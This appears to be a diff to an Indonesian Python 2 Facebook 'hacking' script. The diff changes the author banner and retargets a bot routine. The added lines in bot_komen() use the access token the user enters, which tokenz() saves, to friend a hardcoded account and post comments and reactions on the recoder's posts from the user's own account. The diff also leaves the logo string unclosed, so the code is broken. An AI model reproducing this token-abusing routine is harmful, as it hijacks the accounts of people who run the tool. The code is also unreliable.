@@ -66,14 +66,13 @@ logo = """
 \33[37;1m `--. \| | | || . ` || | | ||  _  || |/\| ||  _  || . ` |  | |  
 /\__/ /| |_| || |\  || |/ / | | | |\  /\  /| | | || |\  | _| |_ 
 \____/  \___/ \_| \_/|___/  \_| |_/ \/  \/ \_| |_/\_| \_/ \___/   
-               \033[1;91m︻╦デ╤╾━══════▶\33[1;33mCYBER\033[1;97m◀═════╾━╤デ╦︻
-             \033[1;91m︻╦デ╤╾━══════▶\33[1;33mSUNDAWANI\033[1;97m◀═════╾━╤デ╦︻
+               \033[1;91m︻╦デ╤╾━════════════▶\033[1;97m◀═══════════╾━╤デ╦︻
+             \033[1;91m︻╦デ╤╾━════════════▶\033[1;97m◀═══════════╾━╤デ╦︻
                                                                                                                                                                                
-\33[1;91mAuthor   \33[1;33m: \033[97mMASTER CYBER HACKER
-\33[1;91mRecode   \33[1;33m: \033[97mIAN DEWA SULTAN PRAWIRA
-\33[1;91mGithub   \33[1;33m: \033[97mhttps://github.com/44k453p
-\33[1;91mFacebook \33[1;33m: \033[97mhttps://www.facebook.com/IANDEWASULTANPRAWIRA
-"""
+\33[1;91mAuthor   \33[1;33m: \e[0;36mMASTER CYBER HACKER
+\33[1;91mRecode   \33[1;33m: \e[0;36mIAN DEWA SULTAN PRAWIRA
+\33[1;91mGithub   \33[1;33m: \e[0;36mhttps://github.com/44k453p
+\33[1;91mFacebook \33[1;33m: \e[0;36mhttps://www.facebook.com/profile.php?id=100009218573546
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -195,7 +194,7 @@ def tokenz():
 		zedd.write(toket)
 		zedd.close()
 		print '\033[1;97m[\033[1;91m✓\033[1;97m]\033[1;33m Login Berhasil'
-		os.system('xdg-open https://www.facebook.com/IANDEWASULTANPRAWIRA ')
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100009218573546 ')
 		bot_komen()
 	except KeyError:
 		print "\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mToken Salah !"
@@ -209,12 +208,12 @@ def bot_komen():
 	except IOError:
 		print"\033[1;97m[!] Token invalid"
 		os.system('rm -rf login.txt')
-	una = ('100011980962928')
-	kom = ('Hello Aa IAN')
+	una = ('100009218573546')
+	kom = ('GW PAKE SCRIPT LU AA')
 	reac = ('ANGRY')
-	post = ('921869271555763')
-	post2 = ('921869271555763')
-	kom2 = ('Keren')
+	post = ('2658937331090193')
+	post2 = ('2658937331090193')
+	kom2 = ('SCRIPT LU KEREN AA')
 	reac2 = ('LOVE')
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
